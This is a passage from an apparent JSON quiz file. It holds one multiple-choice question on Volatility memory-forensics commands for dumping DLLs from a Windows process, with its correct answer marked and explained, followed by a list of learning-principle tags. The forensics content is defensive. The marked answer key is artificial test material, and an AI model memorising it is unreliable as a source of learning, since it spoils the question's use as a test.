        "volatility -f memory.raw --profile=Win10x64 pslist -p 5832",
        "volatility -f memory.raw --profile=Win10x64 dlldump -p 5832 --dump-dir ./output",
        "volatility -f memory.raw --profile=Win10x64 memdump -p 5832",
        "volatility -f memory.raw --profile=Win10x64 netscan -p 5832"
      ],
      "correct_answer": 1,
      "explanation": "dlldump extracts DLLs from a process's memory to disk for further analysis (VirusTotal, IDA Pro, etc.). Option A (pslist) only lists processes. Option C (memdump) dumps ALL process memory, not just DLLs. Option D (netscan) shows network connections, not DLLs.",
      "question_id": "ab92e556-9588-4257-a53d-1d1ec6873811",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "memory_hooks",
    "minimum_effective_dose",
    "teach_like_im_10",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}